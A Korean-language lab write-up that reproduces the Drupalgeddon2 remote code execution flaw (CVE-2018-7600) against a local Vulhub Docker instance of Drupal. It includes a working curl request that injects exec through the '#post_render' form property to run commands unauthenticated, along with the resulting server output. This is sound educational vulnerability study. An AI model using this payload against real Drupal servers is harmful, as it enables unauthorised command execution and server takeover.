# CVE-2018-7600 - Drupalgeddon2 Remote Code Execution

## 1. 개요

- **CVE 번호:** CVE-2018-7600
- **취약점 이름:** Drupalgeddon2
- **설명:**
Drupal의 폼 렌더링 시스템에서 발생하는 취약점으로, 인증되지 않은 공격자가 원격에서 임의의 명령어를 실행할 수 있는 RCE(Remote Code Execution) 취약점입니다. Drupal 7.x 및 8.x의 특정 버전에서 발견되었으며, 매우 치명적인 영향도를 갖습니다.

---

## 2. 실습 환경 구성

### 2.1 실습 환경 정보

- **가상 환경:** VirtualBox + Ubuntu 22.04
- **Docker 버전:** 26.1.3
- **Docker Compose:** 1.29.2

### 2.2 취약 환경 구성 절차

```
# Vulhub 저장소 Fork 및 Clone
cd ~
git clone https://github.com/Parkjoonhyeong/vulhub.git
cd vulhub/drupal/CVE-2018-7600

# docker-compose.yml 확인 및 수정 (MySQL 추가)
nano docker-compose.yml
```

`docker-compose.yml` 예시:

![1](https://github.com/user-attachments/assets/5cd2472d-36a2-4731-ab0d-8e65461a3da3)


```
# 환경 실행
sudo docker-compose up -d
```

![2](https://github.com/user-attachments/assets/75b9bb73-315a-4818-a759-6ffd37988f1a)



### 2.3 컨테이너 상태 확인

```
docker ps
```

정상 상태 예시:

![3](https://github.com/user-attachments/assets/c77545a4-0aae-4885-8098-050a0e0b9300)



---

## 3. Drupal 설치

1. 브라우저 접속: `http://localhost:8080`
2. Drupal 설치 마법사 단계:
    - Language: English
    - Profile: Standard
    - Database:
        - **Database name:** drupal
        - **Username:** root
        - **Password:** root
        - **Host:** db
        - **Port:** 3306
    - 사이트 정보:
        - Site name: PoC Test Site
        - Admin ID/PW: root / root1234

설치 완료 후 관리자 페이지 진입 가능 상태 확인.

![4](https://github.com/user-attachments/assets/df26d235-b86c-4b3f-9024-d44159b7e299)



---

## 4. PoC 실행

### 4.1 공격 요청 (curl 사용)

```
curl -s -X POST "http://localhost:8080/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
```

**이 요청은 Drupal의 `/user/register` 경로에 POST 요청을 보내며, 다음과 같은 방식으로 취약점을 트리거합니다:**

- **`ajax_form=1&_wrapper_format=drupal_ajax`** : Drupal의 Ajax 처리를 유도
- **`element_parents=account/mail/%23value`** : 폼 필드 경로를 지정하여 조작 위치 지정
- **`mail[#post_render][]=exec`** : **`post_render`** 함수로 PHP의 **`exec()`**를 지정
- **`mail[#markup]=id`** : 실행할 명령어로 리눅스의 **`id`** 명령 전달

즉, 폼 렌더링 과정에서 Drupal이 **`exec('id')`**를 실행하도록 만들어 **임의의 명령어 실행**을 유도합니다.

![5](https://github.com/user-attachments/assets/8a09157e-ca2e-45aa-8cc5-2f252424de17)


### 4.2 결과

```
[{"command":"insert","method":"replaceWith","selector":null,"data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)..."}]
```

응답 JSON 데이터에서 **`data`** 항목에 명령어 실행 결과(**`id`** 출력 결과)가 포함되어 있으며,
이는 Drupal 웹 서버 컨테이너의 리눅스 사용자 정보입니다.

- **`uid=33(www-data)`** : 현재 실행 중인 웹 프로세스의 UID
- **`gid=33(www-data)`** : 그룹 ID 정보

**이는 서버 측 명령어가 실제로 실행되었고, 그 결과가 HTTP 응답에 포함되었음을 보여줍니다.**

> 응답 본문 내에 uid=33(www-data) 등의 리눅스 명령어 실행 결과가 포함되어 있음
> 

## 5. 결론

CVE-2018-7600, 일명 Drupalgeddon2로 불리는 이 취약점은 Drupal의 Ajax 기반 폼 렌더링 처리 과정에서 발생하는 치명적인 RCE(Remote Code Execution) 보안 취약점입니다. 이 취약점은 인증되지 않은 사용자가 단순한 폼 제출만으로 서버 내부의 명령어를 실행할 수 있게 하며, 공격자는 시스템 제어권 획득, 백도어 설치, 추가 공격 경로 확보 등 다양한 악용이 가능합니다.

본 실습에서는 Vulhub 프로젝트를 활용하여 Drupal 8.5.0 기반의 취약 환경을 Docker로 구축하였고, 해당 환경에서 취약한 경로(`/user/register`)로 조작된 Ajax 요청을 전송하여 명령어(`id`) 실행 결과를 확인하였습니다. 이 과정을 통해 다음과 같은 사실을 입증하였습니다:

- Drupal 설치 직후 기본 설정 상태에서도 본 취약점이 악용 가능함을 확인
- `curl`을 통해 간단한 PoC 공격 요청을 구성할 수 있으며,
- 응답 결과에서 실제 리눅스 명령어 실행 결과(`uid=33(www-data)` 등)를 확인하여 RCE 성공을 검증함

이번 실습을 통해 복잡한 리버스 엔지니어링 없이도 웹 취약점만으로 서버에 직접 명령어를 실행할 수 있는 보안 위협의 현실성과, 컨테이너 기반 실습 환경의 재현 가능성 및 교육적 가치를 체감할 수 있었습니다.
